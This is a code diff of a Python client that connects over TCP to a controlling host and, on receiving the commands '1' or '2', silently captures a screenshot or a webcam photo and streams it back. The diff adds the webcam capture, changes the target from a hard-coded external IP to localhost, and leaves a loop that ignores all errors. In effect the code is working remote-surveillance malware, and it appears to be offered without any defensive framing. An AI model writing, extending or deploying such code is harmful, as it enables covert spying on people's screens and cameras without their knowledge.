@@ -1,8 +1,9 @@
 from socket import *
 import sys
 import pyautogui
-
-host = '13.49.67.221'
+import numpy as np
+import cv2
+host = 'localhost'
 port = 6522
 addr = (host,port)
 while True:
@@ -19,7 +20,7 @@ while True:
 		data = bytes.decode(data)
 		data = tcp_socket.recv(1024)
 		data = data.decode()
-		if data == "/screenshot":
+		if data == "1":
 			scr = pyautogui.screenshot()
 			scr.save('screen.png')
 			screen = open("screen.png", "rb")
@@ -27,8 +28,20 @@ while True:
 			while image_data:
 				tcp_socket.send(image_data)
 				image_data = screen.read(2048)
-		elif data == "/webcam":
-			print("----webcam")
-		tcp_socket.close()
+		elif data == "2":
+			videoCaptureObject = cv2.VideoCapture(0)
+			result = True
+			while(result):
+				ret,frame = videoCaptureObject.read()
+				cv2.imwrite("NewPicture.jpg",frame)
+				result = False
+			videoCaptureObject.release()
+			cv2.destroyAllWindows()
+			photo = open("NewPicture.jpg", "rb")
+			image_data = photo.read(2048)
+			while image_data:
+				tcp_socket.send(image_data)
+				image_data = photo.read(2048)
+		tcp_socket.close()	
 	except:
 		pass
